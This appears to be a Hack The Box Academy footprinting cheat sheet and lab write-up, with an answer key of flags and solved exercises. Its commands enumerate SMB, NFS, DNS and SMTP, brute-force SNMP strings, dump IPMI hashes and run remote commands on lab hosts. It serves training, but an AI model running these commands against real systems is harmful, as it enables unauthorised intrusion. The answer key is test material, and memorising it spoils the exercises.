## Infrastructure-based Enumeration

|**Command**|**Description**|
|-|-|
| `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .` | Certificate transparency. |
| `for i in $(cat ip-addresses.txt);do shodan host $i;done` | Scan each IP address in a list using Shodan. |

----
## Host-based Enumeration


##### FTP
|**Command**|**Description**|
|-|-|
| `ftp <FQDN/IP>` | Interact with the FTP service on the target. |
| `nc -nv <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `telnet <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | Interact with the FTP service on the target using encrypted connection. |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Download all available files on the target FTP server. |


##### SMB
|**Command**|**Description**|
|-|-|
| `smbclient -N -L //<FQDN/IP>` | Null session authentication on SMB. |
| `smbclient //<FQDN/IP>/<share>` | Connect to a specific SMB share. |
| `rpcclient -U "" <FQDN/IP>` | Interaction with the target using RPC. |
| `samrdump.py <FQDN/IP>` | Username enumeration using Impacket scripts. |
| `smbmap -H <FQDN/IP>` | Enumerating SMB shares. |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerating SMB shares using null session authentication. |
| `enum4linux-ng.py <FQDN/IP> -A` | SMB enumeration using enum4linux. |


##### NFS
|**Command**|**Description**|
|-|-|
| `showmount -e <FQDN/IP>` | Show available NFS shares. |
| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Mount the specific NFS share to ./target-NFS |
| `umount ./target-NFS` | Unmount the specific NFS share. |


##### DNS
|**Command**|**Description**|
|-|-|
| `dig ns <domain.tld> @<nameserver>` | NS request to the specific nameserver. |
| `dig any <domain.tld> @<nameserver>` | ANY request to the specific nameserver. |
| `dig axfr <domain.tld> @<nameserver>` | AXFR request to the specific nameserver. |
| `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>` | Subdomain brute forcing. |



##### SMTP
|**Command**|**Description**|
|-|-|
| `telnet <FQDN/IP> 25` |  |


##### IMAP/POP3
|**Command**|**Description**|
|-|-|
| `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. |
| `openssl s_client -connect <FQDN/IP>:imaps` | Connect to the IMAPS service. |
| `openssl s_client -connect <FQDN/IP>:pop3s` | Connect to the POP3s service. |


##### SNMP
|**Command**|**Description**|
|-|-|
| `snmpwalk -v2c -c <community string> <FQDN/IP>` | Querying OIDs using snmpwalk. |
| `onesixtyone -c community-strings.list <FQDN/IP>` | Bruteforcing community strings of the SNMP service. |
| `braa <community string>@<FQDN/IP>:.1.*` | Bruteforcing SNMP service OIDs. |


##### MySQL
|**Command**|**Description**|
|-|-|
| `mysql -u <user> -p<password> -h <FQDN/IP>` | Login to the MySQL server. |


##### MSSQL
|**Command**|**Description**|
|-|-|
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |


##### IPMI
|**Command**|**Description**|
|-|-|
| `msf6 auxiliary(scanner/ipmi/ipmi_version)` | IPMI version detection. |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump IPMI hashes. |


##### Linux Remote Management
|**Command**|**Description**|
|-|-|
| `ssh-audit.py <FQDN/IP>` | Remote security audit against the target SSH service. |
| `ssh <user>@<FQDN/IP>` | Log in to the SSH server using the SSH client. |
| `ssh -i private.key <user>@<FQDN/IP>` | Log in to the SSH server using private key. |
| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication. |


##### Windows Remote Management
|**Command**|**Description**|
|-|-|
| `rdp-sec-check.pl <FQDN/IP>` | Check the security settings of the RDP service. |
| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>` | Log in to the RDP server from Linux. |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>` | Log in to the WinRM server. |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Execute command using the WMI service. |

##### Oracle TNS
|**Command**|**Description**|
|-|-|
| `./odat.py all -s <FQDN/IP>` | Perform a variety of scans to gather information about the Oracle database services and its components. |
| `sqlplus <user>/<pass>@<FQDN/IP>/<db>` | Log in to the Oracle database. |
| `./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt` | Upload a file with Oracle RDBMS. |

# Footprinting Module

## Section Questions and their Answers

|Section|Question Number|Answer|
|---|---|---|
|FTP|Question 1|InFreight FTP v1.1|
|FTP|Question 2|HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}|
|SMB|Question 1|Samba smbd 4.6.2|
|SMB|Question 2|sambashare|
|SMB|Question 3|HTB{o873nz4xdo873n4zo873zn4fksuhldsf}|
|SMB|Question 4|DEVOPS|
|SMB|Question 5|InFreight SMB v3.1|
|SMB|Question 6|/home/sambauser|
|NFS|Question 1|HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}|
|NFS|Question 2|HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}|
|DNS|Question 1|ns.inlanefreight.htb|
|DNS|Question 2|HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}|
|DNS|Question 3|10.129.34.16|
|DNS|Question 4|win2k.dev.inlanefreight.htb|
|SMTP|Question 1|InFreight ESMTP v2.11|
|SMTP|Question 2|robin|
|IMAP / POP3|Question 1|InlaneFreight Ltd|
|IMAP / POP3|Question 2|dev.inlanefreight.htb|
|IMAP / POP3|Question 3|HTB{roncfbw7iszerd7shni7jr2343zhrj}|
|IMAP / POP3|Question 4|InFreight POP3 v9.188|
|IMAP / POP3|Question 5|devadmin@inlanefreight.htb|
|IMAP / POP3|Question 6|HTB{983uzn8jmfgpd8jmof8c34n7zio}|
|SNMP|Question 1|devadmin@inlanefreight.htb|
|SNMP|Question 2|Infreight SNMP v0.91|
|SNMP|Question 3|HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}|
|MySQL|Question 1|MySQL 8.0.27|
|MySQL|Question 2|ultrices@google.htb|
|MSSQL|Question 1|ILF-SQL-01|
|MSSQL|Question 2|Employees|
|Oracle TNS|Question 1|E066D214D5421CCC|
|IPMI|Question 1|admin|
|IPMI|Question 2|trinity|
|Footprinting Lab - Easy|Question 1|HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}|
|Footprinting Lab - Medium|Question 1|lnch7ehrdn43i7AoqVPK4zWR|
|Footprinting Lab - Hard|Question 1|cr3n4o7rzse7rzhnckhssncif7ds|

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# FTP

## Question 1

### "Which version of the FTP server is running on the target system? Submit the entire banner as the answer."

Students can use `Nmap` to enumerate the service and enable packet tracing to see that the version is `InFreight FTP v1.1`:

Code: shell

```shell
sudo nmap -p21  -sV --disable-arp-ping -n --packet-trace STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo nmap -p21 -sV --disable-arp-ping -n --packet-trace 10.129.131.113

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-02 17:15 BST
SENT (0.3671s) ICMP [10.10.14.69 > 10.129.131.113 Echo request (type=8/code=0) id=16571 seq=0] IP [ttl=42 id=15871 iplen=28 ]
SENT (0.3672s) TCP 10.10.14.69:59720 > 10.129.131.113:443 S ttl=48 id=14574 iplen=44  seq=3256864205 win=1024 <mss 1460>
SENT (0.3672s) TCP 10.10.14.69:59720 > 10.129.131.113:80 A ttl=49 id=44467 iplen=40  seq=0 win=1024 
SENT (0.3673s) ICMP [10.10.14.69 > 10.129.131.113 Timestamp request (type=13/code=0) id=34878 seq=0 orig=0 recv=0 trans=0] IP [ttl=54 id=12777 iplen=40 ]
RCVD (0.4417s) ICMP [10.129.131.113 > 10.10.14.69 Echo reply (type=0/code=0) id=16571 seq=0] IP [ttl=63 id=60357 iplen=28 ]
SENT (0.4909s) TCP 10.10.14.69:59976 > 10.129.131.113:21 S ttl=48 id=65432 iplen=44  seq=1121305418 win=1024 <mss 1460>
RCVD (0.5671s) TCP 10.129.131.113:21 > 10.10.14.69:59976 SA ttl=63 id=0 iplen=44  seq=433890996 win=64240 <mss 1357>
NSOCK INFO [0.7110s] nsock_iod_new2(): nsock_iod_new (IOD #1)
NSOCK INFO [0.7110s] nsock_connect_tcp(): TCP connection requested to 10.129.131.113:21 (IOD #1) EID 8
NSOCK INFO [0.7890s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.131.113:21]
Service scan sending probe NULL to 10.129.131.113:21 (tcp)
NSOCK INFO [0.7890s] nsock_read(): Read request from IOD #1 [10.129.131.113:21] (timeout: 6000ms) EID 18
NSOCK INFO [6.2350s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 18 [10.129.131.113:21] (24 bytes): 220 InFreight FTP v1.1..

<SNIP>

Nmap scan report for 10.129.131.113
Host is up (0.075s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp

<SNIP>
```

Alternatively, students can connect to the FTP server directly to attain the version it is running:

Code: shell

```shell
ftp STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ftp 10.129.131.113

Connected to 10.129.131.113.
220 InFreight FTP v1.1
```

Answer: `InFreight FTP v1.1`

# FTP

## Question 2

### "Enumerate the FTP server and find the flag.txt file. Submit the contents of it as the answer."

Students need to connect to the FTP service/server on the spawned target machine using anonymous login (i.e., using the credentials `anonymous:anonymous`) to get/download the flag file "flag.txt":

Code: shell

```shell
ftp STMIP
get flag.txt
!cat flag.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ftp 10.129.131.113

Connected to 10.129.131.113.
220 InFreight FTP v1.1
Name (10.129.131.113:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get flag.txt
local: flag.txt remote: flag.txt
200 PORT command successful
150 Opening BINARY mode data connection for flag.txt (39 bytes)
226 Transfer complete
39 bytes received in 0.00 secs (309.6418 kB/s)
ftp> !cat flag.txt

HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}
```

Answer: `HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}`

# SMB

## Question 1

### "What version of the SMB server is running on the target system? Submit the entire banner as the answer."

Students need to launch an `Nmap` scan against port 445 on the spawned target machine to find the version:

Code: shell

```shell
sudo nmap -p445 -sV -sC STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo nmap -p445 -sV -sC 10.129.131.113

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-02 17:20 BST
Nmap scan report for 10.129.131.113
Host is up (0.075s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.6.2

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-08-02T16:20:29
|_  start_date: N/A
|_nbstat: NetBIOS name: DEVSMB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

```

Answer: `Samba smbd 4.6.2`

# SMB

## Question 2

### "What is the name of the accessible share on the target?"

Students need to use `smbclient` with the `-N` (short version of `--no-pass`) and `-L` (short version of `--list`) options to list the shares on the spawned target machine:

Code: shell

```shell
smbclient -N -L STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ smbclient -N -L 10.129.131.113

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      InFreight SMB v3.1
	IPC$            IPC       IPC Service (InlaneFreight SMB server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

From the output, students will know that the name of the accessible share is `sambashare`.

Answer: `sambashare`

# SMB

## Question 3

### "Connect to the found share and find the flag.txt. Submit the contents as the answer."

Students need to connect to the previously found share `sambashare` using `smbclient` and use the `get` command to download the flag file from `contents\flag.txt`:

Code: shell

```shell
smbclient //STMIP/sambashare -N
get contents\flag.txt
!cat contents\\flag.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ smbclient //10.129.202.5/sambashare -N

Try "help" to get a list of possible commands.
smb: \> get contents\flag.txt 
getting file \contents\flag.txt of size 38 as contents\flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> !cat contents\\flag.txt

HTB{o873nz4xdo873n4zo873zn4fksuhldsf}
```

Answer: `HTB{o873nz4xdo873n4zo873zn4fksuhldsf}`

# SMB

## Question 4

### "Find out which domain the server belongs to."

Students first need to connect to the spawned target machine using `rpcclient` and provide an empty password when prompted to:

Code: shell

```shell
rpcclient -U "" STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ rpcclient -U "" 10.129.202.5

Enter WORKGROUP\'s password: 
rpcclient $>
```

Students then need to use `querydominfo` to find the domain which the server belongs to:

Code: shell

```shell
querydominfo
```

```shell-session
rpcclient $> querydominfo

Domain:		DEVOPS
Server:		DEVSMB
Comment:	InlaneFreight SMB server (Samba, Ubuntu)
Total Users:	0
Total Groups:	0
Total Aliases:	0
Sequence No:	1659457519
Force Logoff:	-1
Domain Server State:	0x1
Server Role:	ROLE_DOMAIN_PDC
Unknown 3:	0x1
```

Answer: `DEVOPS`

# SMB

## Question 5

### "Find additional information about that specific share we have found previously and submit the customized version of that specific share as the answer."

Using the same connection from the previous question, students need to use `netsharegetinfo` on `sambashare` to find the customised version of it in `remark`:

Code: shell

```shell
netsharegetinfo sambashare
```

```shell-session
rpcclient $> netsharegetinfo sambashare

netname: sambashare
	remark:	InFreight SMB v3.1
	path:	C:\home\sambauser\
	password:	
	type:	0x0
	perms:	0
	max_uses:	-1
	num_uses:	1
revision: 1
type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE 
DACL
	ACL	Num ACEs:	1	revision:	2
	---
	ACE
		type: ACCESS ALLOWED (0) flags: 0x00 
		Specific bits: 0x1ff
		Permissions: 0x1f01ff: SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
		SID: S-1-1-0
```

Answer: `InFreight SMB v3.1`

# SMB

## Question 6

### "What is the full system path of that specific share?"

From the output of `netsharegetinfo` on `sambashare` from the previous question, students will know that the full system Linux path is `/home/sambauser`:

Code: shell

```shell
netsharegetinfo sambashare
```

```shell-session
rpcclient $> netsharegetinfo sambashare

netname: sambashare
	remark:	InFreight SMB v3.1
	path:	C:\home\sambauser\
	password:	
	type:	0x0
	perms:	0
	max_uses:	-1
	num_uses:	1

<SNIP>
```

Answer: `/home/sambauser`

# NFS

## Question 1

### "Enumerate the NFS service and submit the contents of the flag.txt in the "nfs" share as the answer."

Students can use `showmount` with the `-e` (short version of `--exports`) to list the different shares available:

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ showmount -e 10.129.131.113

Export list for 10.129.131.113:
/var/nfs      10.0.0.0/8
/mnt/nfsshare 10.0.0.0/8
```

Using `mount`, students need to mount the share `/var/nfs`, however, before that, students need to make a directory which they will use to mount the share in, and at last, print the contents of the flag inside it:

Code: shell

```shell
mkdir NFS
sudo mount -t nfs -v STMIP:/var/nfs ./NFS/
cat ./NFS/flag.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ mkdir NFS
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo mount -t nfs -v 10.129.131.113:/var/nfs ./NFS/

mount.nfs: timeout set for Tue Aug  2 17:37:17 2022
mount.nfs: trying text-based options 'vers=4.2,addr=10.129.131.113,clientaddr=10.10.14.69'
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat ./NFS/flag.txt

HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}
```

Answer: `HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}`

# NFS

## Question 2

### "Enumerate the NFS service and submit the contents of the flag.txt in the "nfsshare" share as the answer."

Students can use `showmount` with the `-e` (short version of `--exports`) to list the different shares available:

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ showmount -e 10.129.131.113

Export list for 10.129.131.113:
/var/nfs      10.0.0.0/8
/mnt/nfsshare 10.0.0.0/8
```

Using `mount`, students need to mount the share `/mnt/nfsshare`, however, before that, students need to make a directory which they will use to mount the share in, and at last, print the contents of the flag inside it:

Code: shell

```shell
mkdir NFSShare
sudo mount -t nfs -v STMIP:/mnt/nfsshare ./NFSShare/
cat ./NFSShare/flag.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo mkdir NFSShare
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo mount -t nfs -v 10.129.131.113:/mnt/nfsshare ./NFSShare/

mount.nfs: timeout set for Tue Aug  2 17:39:06 2022
mount.nfs: trying text-based options 'vers=4.2,addr=10.129.131.113,clientaddr=10.10.14.69'
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat ./NFSShare/flag.txt

HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}
```

Answer: `HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}`

# DNS

## Question 1

### "Interact with the target DNS using its IP address and enumerate the FQDN of it."

Students need to use `dig` and specify `ANY` as the query type to enumerate its `Fully Qualified Domain Name` (FQDN) (boxed for emphasis):

Code: shell

```shell
dig ANY inlanefreight.htb @STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~/NFS]
└──╼ [★]$ dig ANY inlanefreight.htb @10.129.42.195

<SNIP>

;; ANSWER SECTION:
inlanefreight.htb.	604800	IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.	604800	IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.	604800	IN	TXT	"MS=ms97310371"
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
-----------------------------------------------------------------------------------------------
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
-----------------------------------------------------------------------------------------------
;; ADDITIONAL SECTION:
ns.inlanefreight.htb.	604800	IN	A	127.0.0.1

;; Query time: 76 msec
;; SERVER: 10.129.42.195#53(10.129.42.195)
;; WHEN: Tue Aug 02 17:39:56 BST 2022
;; MSG SIZE  rcvd: 437
```

Answer: `ns.inlanefreight.htb`

# DNS

## Question 2

### "Identify if its possible to perform a zone transfer and submit the TXT record as the answer. (Format: HTB{...})"

Student first need to attempt to perform a Zone Transfer on the domain `inlanefreight.htb`, which will succeed:

Code: shell

```shell
dig AXFR inlanefreight.htb @STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ dig axfr inlanefreight.htb @10.129.136.145

; <<>> DiG 9.16.15-Debian <<>> axfr inlanefreight.htb @10.129.136.145
;; global options: +cmd
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.	604800	IN	TXT	"MS=ms97310371"
inlanefreight.htb.	604800	IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.	604800	IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
app.inlanefreight.htb.	604800	IN	A	10.129.18.15
dev.inlanefreight.htb.	604800	IN	A	10.12.0.1
internal.inlanefreight.htb. 604800 IN	A	10.129.1.6
mail1.inlanefreight.htb. 604800	IN	A	10.129.18.201
ns.inlanefreight.htb.	604800	IN	A	127.0.0.1
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 92 msec
;; SERVER: 10.129.136.145#53(10.129.136.145)
;; WHEN: Tue Aug 09 08:17:08 BST 2022
;; XFR size: 11 records (messages 1, bytes 560)
```

Subsequently, students need to attempt another Zone Transfer on the `internal.inlanefreight.htb` subdomain to find the flag contained within its `TXT` record (boxed for emphasis):

Code: shell

```shell
dig AXFR internal.inlanefreight.htb @STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ dig AXFR internal.inlanefreight.htb @10.129.42.195

; <<>> DiG 9.16.15-Debian <<>> axfr internal.inlanefreight.htb @10.129.42.195
;; global options: +cmd
internal.inlanefreight.htb. 604800 IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
internal.inlanefreight.htb. 604800 IN	TXT	"MS=ms97310371"
-------------------------------------------------------------------------------------------------------------------------------
internal.inlanefreight.htb. 604800 IN	TXT	"HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}"
-------------------------------------------------------------------------------------------------------------------------------
internal.inlanefreight.htb. 604800 IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
internal.inlanefreight.htb. 604800 IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
internal.inlanefreight.htb. 604800 IN	NS	ns.inlanefreight.htb.
dc1.internal.inlanefreight.htb.	604800 IN A	10.129.34.16
dc2.internal.inlanefreight.htb.	604800 IN A	10.129.34.11
mail1.internal.inlanefreight.htb. 604800 IN A	10.129.18.200
ns.internal.inlanefreight.htb. 604800 IN A	127.0.0.1
vpn.internal.inlanefreight.htb.	604800 IN A	10.129.1.6
ws1.internal.inlanefreight.htb.	604800 IN A	10.129.1.34
ws2.internal.inlanefreight.htb.	604800 IN A	10.129.1.35
wsus.internal.inlanefreight.htb. 604800	IN A	10.129.18.2
internal.inlanefreight.htb. 604800 IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 72 msec
;; SERVER: 10.129.42.195#53(10.129.42.195)
;; WHEN: Tue Aug 02 17:47:54 BST 2022
;; XFR size: 15 records (messages 1, bytes 677)
```

Answer: `HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}`

# DNS

## Question 3

### "What is the IPv4 address of the hostname DC1?"

Using `dig`, students need to perform a zone transfer on the subdomain `internal.inlanefreight.htb` on the spawned target machine to find the IPv4 of DC1 (boxed for emphasis):

Code: shell

```shell
dig AXFR internal.inlanefreight.htb @STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ dig axfr internal.inlanefreight.htb @10.129.42.195

; <<>> DiG 9.16.15-Debian <<>> axfr internal.inlanefreight.htb @10.129.42.195
;; global options: +cmd
internal.inlanefreight.htb. 604800 IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
internal.inlanefreight.htb. 604800 IN	TXT	"MS=ms97310371"
internal.inlanefreight.htb. 604800 IN	TXT	"HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}"
internal.inlanefreight.htb. 604800 IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
internal.inlanefreight.htb. 604800 IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
internal.inlanefreight.htb. 604800 IN	NS	ns.inlanefreight.htb.
-------------------------------------------------------------------------------------------------------------------------------
dc1.internal.inlanefreight.htb.	604800 IN A	10.129.34.16
-------------------------------------------------------------------------------------------------------------------------------
dc2.internal.inlanefreight.htb.	604800 IN A	10.129.34.11
mail1.internal.inlanefreight.htb. 604800 IN A	10.129.18.200
ns.internal.inlanefreight.htb. 604800 IN A	127.0.0.1
vpn.internal.inlanefreight.htb.	604800 IN A	10.129.1.6
ws1.internal.inlanefreight.htb.	604800 IN A	10.129.1.34
ws2.internal.inlanefreight.htb.	604800 IN A	10.129.1.35
wsus.internal.inlanefreight.htb. 604800	IN A	10.129.18.2
internal.inlanefreight.htb. 604800 IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 72 msec
;; SERVER: 10.129.42.195#53(10.129.42.195)
;; WHEN: Tue Aug 02 17:47:54 BST 2022
;; XFR size: 15 records (messages 1, bytes 677)
```

Answer: `10.129.34.16`

# DNS

## Question 4

### "What is the FQDN of the host where the last octet ends with "x.x.x.203"?"

Students can use `dnsenum` on the spawned target machine, specifying `dev.inlanefreight.htb` as the subdomain and `namelist.txt` as the wordlist from `SecLists`:

Code: shell

```shell
dnsenum --dnsserver STMIP --enum -p 0 -s 0 -f /usr/share/SecLists/Discovery/DNS/namelist.txt dev.inlanefreight.htb
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ dnsenum --dnsserver 10.129.42.195 --enum -p 0 -s 0 -f /usr/share/SecLists/Discovery/DNS/namelist.txt dev.inlanefreight.htb

dnsenum VERSION:1.2.6

<SNIP>

Brute forcing with /usr/share/SecLists/Discovery/DNS/namelist.txt:
___________________________________________________________________

dev1.dev.inlanefreight.htb.              604800   IN    A         10.12.3.6
ns.dev.inlanefreight.htb.                604800   IN    A         127.0.0.1
win2k.dev.inlanefreight.htb.             604800   IN    A        10.12.3.203

<SNIP>
```

Students will find out that the `FQDN` of the host where the last octet ends with `203` is `win2k.dev.inlanefreight.htb`.

Answer: `win2k.dev.inlanefreight.htb`

# SMTP

## Question 1

### "Enumerate the SMTP service and submit the banner, including its version s the answer."

Students can use `telnet` to connect to port 25 on the spawned target machine to attain the banner:

Code: shell

```shell
telnet STMIP 25
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ telnet 10.129.42.195 25

Trying 10.129.42.195...
Connected to 10.129.42.195.
Escape character is '^]'.
220 InFreight ESMTP v2.11
```

Answer: `InFreight ESMTP v2.11`

# SMTP

## Question 2

### "Enumerate the SMTP service even further and find the username that exist on the system. Submit it as the answer."

Students first need to download the ["Footprinting-wordlist.zip"](https://academy.hackthebox.com/storage/resources/Footprinting-wordlist.zip)wordlist ZIP file from the "Resources" tab and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/resources/Footprinting-wordlist.zip
unzip Footprinting-wordlist.zip
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/resources/Footprinting-wordlist.zip

--2022-08-03 06:53:53--  https://academy.hackthebox.com/storage/resources/Footprinting-wordlist.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 602 [application/zip]
Saving to: ‘Footprinting-wordlist.zip’

Footprinting-wordlist.zi 100%[==================================>]     602  --.-KB/s    in 0s      

2022-08-03 06:53:53 (10.3 MB/s) - ‘Footprinting-wordlist.zip’ saved [602/602]
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ unzip Footprinting-wordlist.zip

Archive:  Footprinting-wordlist.zip
  inflating: footprinting-wordlist.txt 
```

Subsequently, students need to use `smtp-user-enum`, specifying the downloaded wordlist for the `-U` (short version of `file-of-usernames`) option, and 20 for the `-w` option, which sets the maximum number of seconds for waiting for replies:

Code: shell

```shell
smtp-user-enum -M VRFY -U ./footprinting-wordlist.txt -t STMIP -m 60 -w 20
```

```shell-session
┌─[us-academy-1]─[10.10.14.69]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ smtp-user-enum -M VRFY -U ./footprinting-wordlist.txt -t 10.129.42.195 -m 60 -w 20

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

